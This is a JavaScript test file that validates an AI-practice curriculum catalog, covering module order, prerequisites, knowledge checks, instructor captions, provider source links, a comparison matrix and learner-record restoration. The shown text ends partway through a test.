  const broken = structuredClone(starterCatalog);
  const capstone = broken.modules.find(
    (candidate) => candidate.id === "ai-foundations-capstone",
  );
  assert.ok(capstone?.capstone);
  capstone.capstone.rubric.criteria[0].maxPoints = 19;

  const validation = validateCatalog(broken);
  assert.equal(validation.valid, false);
  assert.ok(
    validation.errors.includes(
      "Module ai-foundations-capstone capstone rubric must total 100 points",
    ),
  );

  const unrelated = structuredClone(starterCatalog);
  const reliableCapstone = unrelated.modules.find(
    (candidate) => candidate.id === "reliable-agent-capstone",
  );
  assert.ok(reliableCapstone?.capstone?.exemplars);
  reliableCapstone.capstone.exemplars[0].artifacts[0].ref =
    "complete/unrelated-artifact.md";
  const unrelatedValidation = validateCatalog(unrelated);
  assert.equal(unrelatedValidation.valid, false);
  assert.ok(
    unrelatedValidation.errors.includes(
      "Capstone exemplar reliable-capstone-complete-exemplar needs unique, complete required artifacts",
    ),
  );
});

test("publishes the complete agent-loop tool context and memory curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "reliable-agent-workflows",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(0, 4), [
    "prepare-agent-work",
    "control-agent-actions",
    "context-engineering",
    "memory-boundaries",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(0, 4).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 4, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 2, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 4);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    if (index > 0) {
      assert.ok(
        module.prerequisites.includes(path.moduleIds[index - 1]),
        `${moduleId} must require ${path.moduleIds[index - 1]}`,
      );
    }
  }
});

test("publishes the Claude orientation and prompting curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "anthropic-claude-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(0, 2), [
    "anthropic-ecosystem-and-interfaces",
    "claude-prompting-in-practice",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(0, 2).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? "ai-foundations-capstone" : path.moduleIds[index - 1];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
  }
});

test("publishes the Claude API tool-use and agent curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "anthropic-claude-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(2, 4), [
    "claude-api-and-sdk-workflows",
    "claude-tools-and-agent-loops",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(2, 4).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? path.moduleIds[1] : path.moduleIds[index + 1];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
  }

  const apiModule = modules.get("claude-api-and-sdk-workflows");
  const apiExample = apiModule?.sections
    .flatMap((section) => section.code?.code ?? [])
    .join("\n");
  assert.match(apiExample, /process\.env\.ANTHROPIC_API_KEY/);
  assert.match(apiExample, /process\.env\.ANTHROPIC_MODEL/);
  assert.doesNotMatch(JSON.stringify(apiModule), /sk-ant-/i);
  assert.ok(
    apiModule?.sources.some(
      (source) =>
        source.url === "https://platform.claude.com/docs/en/api/messages/create",
    ),
  );

  const toolsModule = modules.get("claude-tools-and-agent-loops");
  assert.deepEqual(
    toolsModule?.sections.map((section) => section.id),
    [
      "tool-use-is-a-contract",
      "design-narrow-tools",
      "drive-an-explicit-loop",
      "enforce-side-effect-safety",
      "workflow-or-agent",
    ],
  );
  assert.ok(
    toolsModule?.sources.some(
      (source) =>
        source.url ===
        "https://platform.claude.com/docs/en/agents-and-tools/tool-use/how-tool-use-works",
    ),
  );
});

test("publishes and validates the complete seven-module Claude practice path", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "anthropic-claude-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(4), [
    "claude-safety-and-trust-boundaries",
    "claude-evaluation-and-observability",
    "migrating-to-and-from-claude",
  ]);
  assert.equal(path.moduleIds.length, 7);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? "ai-foundations-capstone" : path.moduleIds[index - 1];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
  }

  const migration = modules.get("migrating-to-and-from-claude");
  assert.ok(
    migration?.sources.some((source) =>
      source.url.includes("/about-claude/models/migration-guide"),
    ),
  );
  assert.ok(
    migration?.sources.some((source) =>
      source.url.includes("/about-claude/model-deprecations"),
    ),
  );
});

test("publishes the OpenAI orientation and prompting curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "openai-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(0, 2), [
    "openai-ecosystem-and-interfaces",
    "openai-prompting-in-practice",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(0, 2).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? "ai-foundations-capstone" : path.moduleIds[index - 1];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
  }
});

test("publishes the OpenAI Responses API tool-use and agent curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "openai-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(2, 4), [
    "openai-responses-api-and-sdk-workflows",
    "openai-tools-and-codex-agent-loops",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(2, 4).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? path.moduleIds[1] : path.moduleIds[index + 1];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
  }

  const api = modules.get("openai-responses-api-and-sdk-workflows");
  const apiText = JSON.stringify(api);
  assert.match(apiText, /process\.env\.OPENAI_MODEL/);
  assert.doesNotMatch(apiText, /sk-[A-Za-z0-9_-]{8,}/);
  assert.ok(
    api.sources.some((source) =>
      source.url.includes("/api/docs/guides/migrate-to-responses"),
    ),
  );

  const tools = modules.get("openai-tools-and-codex-agent-loops");
  assert.ok(
    tools.sections.some((section) => section.id === "match-calls-results-and-state"),
  );
  assert.ok(
    tools.sections.some((section) => section.id === "bound-codex-and-agent-autonomy"),
  );
  assert.ok(
    tools.sources.some((source) =>
      source.url.includes("/api/docs/guides/function-calling"),
    ),
  );
});

test("publishes and validates the complete seven-module OpenAI practice path", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "openai-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(4), [
    "openai-safety-and-trust-boundaries",
    "openai-evaluation-and-observability",
    "migrating-to-and-from-openai",
  ]);
  assert.equal(path.moduleIds.length, 7);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? "ai-foundations-capstone" : path.moduleIds[index - 1];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
  }

  const safety = modules.get("openai-safety-and-trust-boundaries");
  assert.ok(
    safety.sources.some((source) =>
      source.url.includes("/api/docs/guides/safety-best-practices"),
    ),
  );
  assert.ok(
    safety.sections.some((section) => section.id === "red-team-output-and-trajectories"),
  );

  const evaluation = modules.get("openai-evaluation-and-observability");
  assert.ok(
    evaluation.sources.some((source) =>
      source.url.includes("/api/docs/guides/trace-grading"),
    ),
  );

  const migration = modules.get("migrating-to-and-from-openai");
  assert.ok(
    migration.sources.some((source) =>
      source.url.includes("/api/docs/guides/migrate-to-responses"),
    ),
  );
  assert.ok(
    migration.sources.some((source) =>
      source.url.includes("/api/docs/deprecations"),
    ),
  );
});

test("publishes the Gemini orientation and prompting curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "google-gemini-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(0, 2), [
    "gemini-ecosystem-and-interfaces",
    "gemini-prompting-in-practice",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(0, 2).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.instructions.length >= 4, `${moduleId} needs practice`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? "ai-foundations-capstone" : path.moduleIds[index - 1];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
    assert.match(
      JSON.stringify(module.activity),
      /conceptual|fixture|no-cost/i,
      `${moduleId} needs a no-paid-call alternative`,
    );
  }

  const orientation = modules.get("gemini-ecosystem-and-interfaces");
  assert.ok(
    orientation.sources.some((source) =>
      source.url.startsWith("https://support.google.com/gemini/"),
    ),
  );
  assert.ok(
    orientation.sources.some((source) =>
      source.url.includes("/gemini-api/docs/ai-studio-quickstart"),
    ),
  );

  const prompting = modules.get("gemini-prompting-in-practice");
  assert.ok(
    prompting.sources.some((source) =>
      source.url.includes("/gemini-api/docs/prompting-strategies"),
    ),
  );
  assert.ok(
    prompting.sources.some((source) =>
      source.url.includes("/gemini-api/docs/structured-output"),
    ),
  );
});

test("publishes the Gemini API tool-use and agent curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "google-gemini-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(2, 4), [
    "gemini-api-and-sdk-workflows",
    "gemini-tools-and-agent-loops",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(2, 4).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? path.moduleIds[1] : path.moduleIds[index + 1];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
    assert.match(
      JSON.stringify(module.activity),
      /synthetic|fixture|no-paid-call/i,
      `${moduleId} needs a no-paid-call fixture`,
    );
  }

  const api = modules.get("gemini-api-and-sdk-workflows");
  const apiText = JSON.stringify(api);
  assert.match(apiText, /process\.env\.GEMINI_API_KEY/);
  assert.match(apiText, /process\.env\.GEMINI_MODEL/);
  assert.match(apiText, /SAFETY/);
  assert.match(apiText, /MAX_TOKENS/);
  assert.match(apiText, /RECITATION/);
  assert.doesNotMatch(apiText, /AIza[A-Za-z0-9_-]{20,}/);
  assert.ok(
    api.sources.some((source) =>
      source.url.includes("/gemini-api/docs/troubleshooting"),
    ),
  );

  const tools = modules.get("gemini-tools-and-agent-loops");
  assert.ok(
    tools.sections.some((section) => section.id === "match-calls-results-and-loop-state"),
  );
  assert.ok(
    tools.sources.some((source) =>
      source.url.includes("/gemini-api/docs/function-calling"),
    ),
  );
  assert.ok(
    tools.sources.some((source) => source.url.startsWith("https://google.github.io/adk-docs/")),
  );
});

test("publishes and validates the complete seven-module Gemini practice path", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "google-gemini-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(4), [
    "gemini-safety-and-trust-boundaries",
    "gemini-evaluation-and-observability",
    "migrating-to-and-from-gemini",
  ]);
  assert.equal(path.moduleIds.length, 7);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? "ai-foundations-capstone" : path.moduleIds[index - 1];
    assert.ok(module.prerequisites.includes(expectedPrerequisite));
    assert.match(JSON.stringify(module.activity), /synthetic|fixture|no-paid-call/i);
  }

  const safety = modules.get("gemini-safety-and-trust-boundaries");
  assert.ok(safety.sources.some((source) => source.url.includes("/safety-settings")));
  const evaluation = modules.get("gemini-evaluation-and-observability");
  assert.ok(evaluation.sources.some((source) => source.url.includes("/evaluate/")));
  const migration = modules.get("migrating-to-and-from-gemini");
  assert.ok(migration.sources.some((source) => source.url.includes("/deprecations")));
  assert.ok(migration.sources.some((source) => source.url.includes("/libraries")));
});

test("publishes a balanced source-backed provider comparison matrix", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "providers-in-practice",
  );
  const module = starterCatalog.modules.find(
    (candidate) => candidate.id === "compare-provider-capabilities",
  );
  assert.ok(path);
  assert.ok(module);
  assert.equal(path.moduleIds[3], module.id);
  assert.ok(module.prerequisites.includes("choose-a-provider"));
  assert.equal(module.sections.length, 5);
  assert.ok(module.activity?.instructions.length >= 5);
  assert.equal(module.activity?.evidence.length, 2);
  assert.equal(module.knowledgeCheck.questions.length, 5);
  assert.equal(module.instructorScript?.schemaVersion, "1.1");
  assert.ok(module.instructorScript?.captions?.length >= 5);
  assert.ok(module.instructorScript?.reducedMotionAlternative);

  const matrix = module.comparisonMatrix;
  assert.ok(matrix);
  assert.equal(matrix.asOf, "2026-07-25");
  assert.deepEqual(
    matrix.dimensions.map((dimension) => dimension.id),
    [
      "provider-interfaces",
      "api-request-response",
      "tool-calling",
      "context-and-state",
      "safety-controls",
      "evaluation",
      "observability",
      "operational-constraints",
    ],
  );

  const declaredSources = new Set(module.sources.map((source) => source.url));
  const statuses = new Set();
  const providerCellCounts = { anthropic: 0, openai: 0, google: 0 };
  for (const dimension of matrix.dimensions) {
    assert.ok(dimension.portableCore);
    for (const provider of ["anthropic", "openai", "google"]) {
      const cell = dimension.providers[provider];
      assert.ok(cell.summary);
      assert.ok(cell.sourceUrls.length >= 1);
      assert.ok(
        cell.sourceUrls.every((sourceUrl) => declaredSources.has(sourceUrl)),
      );
      statuses.add(cell.status);
      providerCellCounts[provider] += 1;
    }
  }
  assert.deepEqual(providerCellCounts, {
    anthropic: 8,
    openai: 8,
    google: 8,
  });
  assert.deepEqual(
    [...statuses].sort(),
    ["changing", "documented", "non-equivalent", "unknown"],
  );
  assert.deepEqual(
    Object.fromEntries(
      ["Anthropic", "OpenAI", "Google"].map((publisher) => [
        publisher,
        module.sources.filter((source) => source.publisher === publisher).length,
      ]),
    ),
    { Anthropic: 7, OpenAI: 7, Google: 7 },
  );
  assert.match(
    JSON.stringify(module.activity),
    /synthetic no-paid-call fixtures/i,
  );
});

test("publishes cross-provider migration planning and cutover runbooks", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "providers-in-practice",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(-2), [
    "plan-cross-provider-migration",
    "execute-cross-provider-cutover",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(-2).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.equal(module.sections.length, 5);
    assert.ok(module.activity?.instructions.length >= 5);
    assert.equal(module.activity?.evidence.length, 2);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 8);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0
        ? "compare-provider-capabilities"
        : "plan-cross-provider-migration";
    assert.ok(module.prerequisites.includes(expectedPrerequisite));
    assert.match(
      JSON.stringify(module.activity),
      /synthetic no-paid-call/i,
    );
  }

  const planning = modules.get("plan-cross-provider-migration");
  const planningText = JSON.stringify(planning);
  const configCode = planning.sections.find(
    (section) => section.id === "build-a-compatibility-map",
  )?.code?.code;
  assert.ok(configCode);
  assert.match(planningText, /process\.env\.ANTHROPIC_API_KEY/);
  assert.match(planningText, /process\.env\.OPENAI_API_KEY/);
  assert.match(planningText, /process\.env\.GEMINI_API_KEY/);
  assert.doesNotMatch(configCode, /sk-[A-Za-z0-9_-]{8,}/);
  assert.doesNotMatch(configCode, /AIza[A-Za-z0-9_-]{20,}/);
  assert.ok(
    planning.sources.some((source) => source.url.includes("migration-guide")),
  );
  assert.ok(
    planning.sources.filter((source) => source.url.includes("deprecation")).length >= 3,
  );

  const cutover = modules.get("execute-cross-provider-cutover");
  const cutoverText = JSON.stringify(cutover);
  assert.match(cutoverText, /stable identifiers/i);
  assert.match(cutoverText, /side effects/i);
  assert.match(cutoverText, /residual-risk/i);
  assert.match(cutoverText, /process\.env\.MIGRATION_ROUTE/);
});

test("restores a v0.20 provider learner record after migration modules are appended", () => {
  const priorCatalog = structuredClone(starterCatalog);
  priorCatalog.contentVersion = "0.20.0";
  const addedIds = new Set([
    "plan-cross-provider-migration",
    "execute-cross-provider-cutover",
  ]);
  priorCatalog.modules = priorCatalog.modules.filter(
    (module) => !addedIds.has(module.id),
  );
  const priorPath = priorCatalog.paths.find(
    (candidate) => candidate.id === "providers-in-practice",
  );
  assert.ok(priorPath);
  priorPath.moduleIds = priorPath.moduleIds.filter(
    (moduleId) => !addedIds.has(moduleId),
  );
  assert.deepEqual(validateCatalog(priorCatalog), { valid: true, errors: [] });
  assert.deepEqual(priorPath.moduleIds, [
    "anthropic-in-practice",
    "openai-in-practice",
    "choose-a-provider",
    "compare-provider-capabilities",
  ]);

  const module = priorCatalog.modules.find(
    (candidate) => candidate.id === "compare-provider-capabilities",
  );
  assert.ok(module);
  const result = scoreKnowledgeCheck(
    module.knowledgeCheck.questions,
    Object.fromEntries(
      module.knowledgeCheck.questions.map((question) => [
        question.id,
        question.answerIndex,
      ]),
    ),
    module.knowledgeCheck.passPercent,
  );
  const progress = recordAssessmentAttempt(
    createEmptyProgress("Portable provider learner"),
    priorCatalog,
    {
      attemptId: "attempt-provider-comparison-v020",
      pathId: priorPath.id,
      moduleId: module.id,
      completedAt: "2026-07-25T14:30:00.000Z",
      result,
    },
  );
  const record = buildPortableLearnerRecord(
    priorCatalog,
    progress,
    "2026-07-25T14:31:00.000Z",
  );
  const restored = restorePortableLearnerRecord(record, starterCatalog);

  assert.equal(restored.valid, true);
  assert.deepEqual(restored.progress, progress);
  assert.equal(record.catalogVersion, "0.20.0");
  assert.equal(progress.attempts[0].contentVersion, "0.20.0");
});

test("publishes the MCP orchestration and handoff curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "reliable-agent-workflows",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(4, 8), [
    "mcp-architecture",
    "mcp-trust-and-security",
    "orchestration-patterns",
    "multi-agent-handoffs",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(4, 8).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 3, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? "memory-boundaries" : path.moduleIds[index + 3];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
  }

  const evaluation = modules.get("agent-evaluation");
  assert.ok(evaluation?.prerequisites.includes("multi-agent-handoffs"));
});

test("publishes the evaluation observability and operations curriculum unit", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "reliable-agent-workflows",
  );
  assert.ok(path);
  assert.deepEqual(path.moduleIds.slice(8, 11), [
    "agent-evaluation",
    "agent-observability",
    "review-agent-results",
  ]);

  const modules = new Map(
    starterCatalog.modules.map((module) => [module.id, module]),
  );
  for (const [index, moduleId] of path.moduleIds.slice(8, 11).entries()) {
    const module = modules.get(moduleId);
    assert.ok(module);
    assert.ok(module.sections.length >= 5, `${moduleId} needs substantive lessons`);
    assert.ok(module.activity?.evidence.length >= 2, `${moduleId} needs evidence`);
    assert.equal(module.knowledgeCheck.questions.length, 5);
    assert.ok(
      new Set(module.knowledgeCheck.questions.map((question) => question.answerIndex))
        .size >= 3,
      `${moduleId} must vary correct-answer positions`,
    );
    assert.ok(module.sources.length >= 4, `${moduleId} needs primary sources`);
    assert.equal(module.instructorScript?.schemaVersion, "1.1");
    assert.ok(module.instructorScript?.transcript);
    assert.ok(module.instructorScript?.captions?.length >= 5);
    assert.ok(module.instructorScript?.reducedMotionAlternative);
    const expectedPrerequisite =
      index === 0 ? "multi-agent-handoffs" : path.moduleIds[index + 7];
    assert.ok(
      module.prerequisites.includes(expectedPrerequisite),
      `${moduleId} must require ${expectedPrerequisite}`,
    );
  }
});

test("publishes a calibrated evidence-mapped reliable-agent capstone", () => {
  const path = starterCatalog.paths.find(
    (candidate) => candidate.id === "reliable-agent-workflows",
  );
  const module = starterCatalog.modules.find(
    (candidate) => candidate.id === "reliable-agent-capstone",
  );
  assert.ok(path);
  assert.ok(module?.capstone);
  assert.equal(path.moduleIds.length, 12);
  assert.equal(path.moduleIds.at(-1), module.id);
  assert.ok(module.prerequisites.includes("review-agent-results"));
  assert.equal(module.sections.length, 6);
  assert.equal(module.knowledgeCheck.questions.length, 5);
  assert.equal(module.instructorScript?.schemaVersion, "1.1");
  assert.equal(module.capstone.requiredArtifacts.length, 8);
  assert.equal(module.capstone.requiresCriterionEvidence, true);
  assert.equal(module.capstone.requiresCalibrationExemplars, true);
  assert.equal(
    module.capstone.rubric.criteria.reduce(
      (total, criterion) => total + criterion.maxPoints,
      0,
    ),
    100,
  );

  const exemplars = new Map(
    module.capstone.exemplars.map((exemplar) => [exemplar.kind, exemplar]),
  );
  assert.equal(exemplars.get("complete")?.expectedScorePercent, 100);
  assert.equal(exemplars.get("complete")?.expectedPassed, true);
  assert.equal(exemplars.get("flawed")?.expectedScorePercent, 31);
  assert.equal(exemplars.get("flawed")?.expectedPassed, false);
});

test("rejects incomplete instructor caption and transcript packages", () => {
  const broken = structuredClone(starterCatalog);
  const module = broken.modules.find(
    (candidate) => candidate.id === "context-engineering",
  );
  assert.ok(module?.instructorScript);
  module.instructorScript.transcript = "Incomplete transcript.";
  module.instructorScript.captions[1].startSeconds =
    module.instructorScript.captions[0].endSeconds - 1;
  module.instructorScript.captions[1].cueId = "missing-cue";
